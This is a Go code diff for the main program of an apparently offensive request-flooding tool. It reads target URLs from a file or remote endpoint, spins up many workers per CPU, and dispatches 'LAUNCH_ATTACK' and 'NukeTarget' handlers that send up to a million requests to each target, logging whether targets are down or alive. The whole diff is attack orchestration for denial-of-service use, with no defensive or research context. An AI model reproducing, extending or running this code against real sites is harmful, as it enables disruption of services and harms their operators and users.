@@ -2,7 +2,9 @@ package main
 
 import (
 	"context"
+	"encoding/json"
 	"flag"
+	"fmt"
 	"log"
 	"os"
 	"os/signal"
@@ -11,6 +13,7 @@ import (
 	"time"
 
 	logw "github.com/andriiyaremenko/logwriter"
+	"github.com/andriiyaremenko/logwriter/color"
 	"github.com/andriiyaremenko/mg/client"
 	"github.com/andriiyaremenko/mg/handler"
 	"github.com/andriiyaremenko/mg/source"
@@ -24,25 +27,26 @@ func main() {
 	workersPerCore := flag.Int("w", 10, "number of workers per logical CPU")
 	amountRequests := flag.Int64("n", 1000000, "number of requests per each target")
 
+	flag.Parse()
+
 	ctx := context.Background()
 	ctx, cancel := context.WithCancel(ctx)
+
 	log := log.New(
 		logw.LogWriter(ctx, os.Stdout, logw.Option(*q, logw.JSONFormatter, time.RFC3339)),
 		"",
 		log.Lmsgprefix,
 	)
 
-	flag.Parse()
-
 	numWorkers := *workersPerCore * runtime.NumCPU()
 
-	var readSource command.Handler
+	var targetSource source.Source
 	switch *t {
 	case "file":
-		readSource = handler.ReadSource(source.GetFromFile(*s), numWorkers)
+		targetSource = source.GetFromFile(*s)
 		log.Printf("reading from file %s", *s)
 	case "endpoint":
-		readSource = handler.ReadSource(source.GetFromEndpoint(client.New(), *s), numWorkers)
+		targetSource = source.GetFromEndpoint(client.New(), *s)
 		log.Printf("reading from endpoint %s", *s)
 	default:
 		log.Fatalln(logw.Error.WithMessage("source type %s is unsupported", *t))
@@ -50,7 +54,7 @@ func main() {
 
 	comm, err := command.NewWithConcurrencyLimit(
 		numWorkers,
-		readSource,
+		handler.LaunchAttack(numWorkers),
 		handler.NukeTarget(*amountRequests),
 		handler.TargetDown(log),
 		handler.TargetAlive(log),
@@ -75,11 +79,74 @@ func main() {
 		os.Exit(1)
 	}()
 
-	ev := comm.Handle(ctx, command.E{Type: "READ_SOURCE"})
+	callBack := func(w command.CommandsWorker, e command.Event) {
+		log.Println(logw.Level(0), string(e.Payload()))
 
-	if err := ev.Err(); err != nil {
-		log.Fatalln(logw.Error, err)
+	readSource:
+		select {
+		case <-ctx.Done():
+			return
+		default:
+		}
+
+		target, keep, err := targetSource()
+
+		if err != nil {
+			log.Println(logw.Error, err)
+			time.Sleep(time.Second * 5)
+
+			goto readSource
+		}
+
+		b, err := json.Marshal(target)
+		if err != nil {
+			log.Println(logw.Error, err)
+
+			goto readSource
+		}
+
+		if !keep {
+			return
+		}
+
+		log.Println(color.ColorizeText(color.ANSIColorGreen, fmt.Sprintf("launching an attack against %s", target.URL)))
+		err = w.Handle(command.E{
+			Type: "LAUNCH_ATTACK",
+			P:    b,
+		})
+		if err != nil {
+			log.Println(logw.Error, err)
+		}
 	}
 
-	log.Println(string(ev.Payload()))
+	w := command.NewWorker(ctx, callBack, comm, 1)
+
+readSource:
+	target, _, err := targetSource()
+
+	if err != nil {
+		log.Println(logw.Error, err)
+		time.Sleep(time.Second * 5)
+
+		goto readSource
+	}
+
+	b, err := json.Marshal(target)
+	if err != nil {
+		log.Println(logw.Error, err)
+
+		goto readSource
+	}
+
+	log.Println(color.ColorizeText(color.ANSIColorGreen, fmt.Sprintf("launching an attack against %s", target.URL)))
+	err = w.Handle(command.E{
+		Type: "LAUNCH_ATTACK",
+		P:    b,
+	})
+
+	if err != nil {
+		log.Println(logw.Error, err)
+	}
+
+	<-c
 }
